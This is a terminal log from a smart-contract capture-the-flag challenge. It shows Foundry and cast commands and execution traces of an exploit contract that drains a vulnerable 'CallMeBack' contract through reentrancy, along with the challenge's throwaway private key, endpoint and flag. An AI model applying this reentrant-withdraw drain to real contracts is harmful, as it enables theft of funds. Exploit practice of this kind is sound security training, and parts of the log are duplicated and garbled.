```Bash

export RPC_URL="http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main"
export PRIVATE_KEY="0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0"
export CHALLENGE="0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A"


export CALLMEBACK="0xb3CEA24519bcF7da2859A864a624428D1dCF7af2"


flag=QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}



```
```Bash
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ source .env
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ CALLMEBACK=$(cast call $CHALLENGE "CONTRACT()(addnithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ CALLMEBACK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)ACK"
echo "CallMeBack: $CALLMEBACK"
# Add to .env
# Add to .envCALLMEBACK=\"$CALLMEBACK\"" >> .env
echo "export CALLMEBACK=\"$CALLMEBACK\"" >> .env
source .env
CallMeBack: 0xE9D2614EBE869CCC2792eA793768F544FBA43087
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ source .env
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check CallMeBack balance
cast balance $CALLMEBACK --rpc-url $RPC_URL --ether

# Check Player address
PLAYER=$(cast wallet address --private-key $PRIVATE_KEY)
cast balance $PLAYER --rpc-url $RPC_URL --ether
1.000000000000000000
Player: 0x077C30e751c30E3B27Cd269ec5ba5571EF03aB74
10.000000000000000000
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ forge script script/Solve.s.sol:SolveScript \
  --rpc-url $RPC_URL \
  --broadcast \
  --legacy \
  -vvvv
[⠢] Compiling...
No files changed, compilation skipped
Traces:
  [397516] SolveScript::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("CALLMEBACK") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [222929] → new Exploit@0x4193930F4f7260105640604043873b3aF61Fff4f
    │   └─ ← [Return] 1002 bytes of code
    ├─ [0] console::log("Exploit deployed at:", Exploit: [0x4193930F4f7260105640604043873b3aF61Fff4f]) [staticcall]
    │   └─ ← [Stop]
    ├─ [91752] Exploit::attack{value: 1000000000000000000}()
    │   ├─ [22385] 0xE9D2614EBE869CCC2792eA793768F544FBA43087::donate{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [36735] 0xE9D2614EBE869CCC2792eA793768F544FBA43087::withdraw(1000000000000000000 [1e18])
    │   │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
    │   │   │   ├─ [8116] 0xE9D2614EBE869CCC2792eA793768F544FBA43087::withdraw(1000000000000000000 [1e18])
    │   │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("Attack executed") [staticcall]
    │   └─ ← [Stop]
    ├─ [7027] Exploit::withdraw()
    │   ├─ [0] 0x077C30e751c30E3B27Cd269ec5ba5571EF03aB74::fallback{value: 2000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("Funds withdrawn to player") [staticcall]
    │   └─ ← [Stop]
    ├─ [22462] 0xf17c437f47dD6af4bDe921c1d63d676273B00cA0::solve()
    │   └─ ← [Stop]
    ├─ [0] console::log("Challenge solved!") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  Exploit deployed at: 0x4193930F4f7260105640604043873b3aF61Fff4f
  Attack executed
  Funds withdrawn to player
  Challenge solved!

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [222929] → new Exploit@0x4193930F4f7260105640604043873b3aF61Fff4f
    └─ ← [Return] 1002 bytes of code

  [93752] Exploit::attack{value: 1000000000000000000}()
    ├─ [22385] 0xE9D2614EBE869CCC2792eA793768F544FBA43087::donate{value: 1000000000000000000}()
    │   └─ ← [Stop]
    ├─ [36735] 0xE9D2614EBE869CCC2792eA793768F544FBA43087::withdraw(1000000000000000000 [1e18])
    │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
    │   │   ├─ [8116] 0xE9D2614EBE869CCC2792eA793768F544FBA43087::withdraw(1000000000000000000 [1e18])
    │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    └─ ← [Stop]

  [7027] Exploit::withdraw()
    ├─ [0] 0x077C30e751c30E3B27Cd269ec5ba5571EF03aB74::fallback{value: 2000000000000000000}()
    │   └─ ← [Stop]
    └─ ← [Stop]

  [22462] 0xf17c437f47dD6af4bDe921c1d63d676273B00cA0::solve()
    └─ ← [Stop]


==========================

Chain 31337

Estimated gas price: 1.673006184 gwei

Estimated total gas used for script: 614085

Estimated amount required: 0.00102736800250164 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0x56dc7269c1806e222adabc98cd6c56244f0fd3413dde75bab98ce42a507179e0
Block: 6
Paid: 0.000046996416714744 ETH (28091 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0xebdb545063102216ad61939fa44e04e3a93cfae33af1b71cd758ece2e9c96cc2
Block: 5
Paid: 0.000158795054960544 ETH (94916 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0xa7fe2ef08328e6662bbe514a3c34cd9e28959f1d1319d0c77452d55caecda660
Block: 6
Paid: 0.000072819267164784 ETH (43526 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x5e311db55f09d7eada966361b69f75e4bdceb54ca05a26e1579ab02bb48a07b3
Contract Address: 0x4193930F4f7260105640604043873b3aF61Fff4f
Block: 4
Paid: 0.000491326783110936 ETH (293679 gas * 1.673006184 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000769937521951008 ETH (460212 gas * avg 1.673006184 gwei)
                                                                                              

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/broadcast/Solve.s.sol/31337/run-latest.json

Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/cache/Solve.s.sol/31337/run-latest.json

nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check if solved
cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL

# Should return: true
true
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ cast storage $CHALLENGE 0 --rpc-url $RPC_URL
0x0000000000000000000000000000000000000000000000000000000000000001
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ cast storage $CHALLENGE 1 --rpc-url $RPC_URL
0x0000000000000000000000000000000000000000000000000000000000000000
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # show events for the challenge address
cast logs $CHALLENGE --rpc-url $RPC_URL
Error: invalid string length
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ cast call $CHALLENGE "flag()(string)" --rpc-url $RPC_URL
Error: server returned an error response: error code 3: execution reverted, data: "0x"
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ source .env

# Get CallMeBack address
CALLMEBACK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
echo "CallMeBack: $CALLMEBACK"

# Add to .env
echo "export CALLMEBACK=\"$CALLMEBACK\"" >> .env
source .env
CallMeBack: 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check CallMeBack balance
cast balance $CALLMEBACK --rpc-url $RPC_URL --ether

# Check Player address
PLAYER=$(cast wallet address --private-key $PRIVATE_KEY)
echo "Player: $PLAYER"

# Check Player balance
cast balance $PLAYER --rpc-url $RPC_URL --ether
1.000000000000000000
Player: 0xd201156e618Bcd1874dCFb01Eebe652b05C87252
10.000000000000000000
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ forge script script/Solve.s.sol:SolveScript \
  --rpc-url $RPC_URL \
  --broadcast \
  --legacy \
  -vvvv
[⠆] Compiling...
No files changed, compilation skipped
Traces:
  [397516] SolveScript::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("CALLMEBACK") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
    │   └─ ← [Return] 1002 bytes of code
    ├─ [0] console::log("Exploit deployed at:", Exploit: [0xD9f928f593C059A6849731E5e86443aEeBaA1375]) [staticcall]
    │   └─ ← [Stop]
    ├─ [91752] Exploit::attack{value: 1000000000000000000}()
    │   ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
    │   │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("Attack executed") [staticcall]
    │   └─ ← [Stop]
    ├─ [7027] Exploit::withdraw()
    │   ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("Funds withdrawn to player") [staticcall]
    │   └─ ← [Stop]
    ├─ [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
    │   └─ ← [Stop]
    ├─ [0] console::log("Challenge solved!") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  Exploit deployed at: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
  Attack executed
  Funds withdrawn to player
  Challenge solved!

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
    └─ ← [Return] 1002 bytes of code

  [93752] Exploit::attack{value: 1000000000000000000}()
    ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
    │   └─ ← [Stop]
    ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
    │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    └─ ← [Stop]

  [7027] Exploit::withdraw()
    ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
    │   └─ ← [Stop]
    └─ ← [Stop]

  [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
    └─ ← [Stop]


==========================

Chain 31337

Estimated gas price: 1.673006184 gwei

Estimated total gas used for script: 614085

Estimated amount required: 0.00102736800250164 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0xc7198436788802fdc90d36591ff72bb08ce2ae40009a419334dbe6e52646bb61
Block: 5
Paid: 0.000046996416714744 ETH (28091 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x887a15a5c7969d0899f1b0b33e78519d3b7f55abd82a179264c64f2031261fa2
Contract Address: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
Block: 4
Paid: 0.000491326783110936 ETH (293679 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x5d0f61180b0d89298b0d070495c32d48ac94b01c1f4f56bcf14307199eb22f18
Block: 5
Paid: 0.000158795054960544 ETH (94916 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0xe0b77ffe40b48c3dd8d5f4cf7c5d604ce09391a34a523e021dc569e01969234b
Block: 6
Paid: 0.000072819267164784 ETH (43526 gas * 1.673006184 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000769937521951008 ETH (460212 gas * avg 1.673006184 gwei)
                                                                                              

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/broadcast/Solve.s.sol/31337/run-latest.json

Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/cache/Solve.s.sol/31337/run-latest.json
```
```Bash
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check if solved
cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL

# Should return: true
true
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[callmeback] You dare challenge me?
[callmeback] 1 - Launch a new instance
[callmeback] 2 - Kill your instance
[callmeback] 3 - Get the flag
[callmeback] Action? 3

[callmeback] What is your ticket? aa40f1a9f367bc64268139a2614ada39
[callmeback] Congratulations! Here is your flag: QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}


nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ 
```
[callmeback] A random degen has appeared!
[callmeback] 1 - Launch a new instance
[callmeback] 2 - Kill your instance
[callmeback] 3 - Get the flag
[callmeback] Action? 1

[callmeback] Your ticket: aa40f1a9f367bc64268139a2614ada39

[callmeback] Creating private blockchain...
[callmeback] Deploying challenge.. (please be patient, this can take a while)

[callmeback] Your private blockchain has been set up,
[callmeback] it will automatically terminate in 15.0 minutes!

[callmeback] RPC Endpoints:
[callmeback]     - http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main
[callmeback]     - ws://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main/ws

[callmeback] The Player private key:         0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0
[callmeback] The Challenge contract address: 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A

```
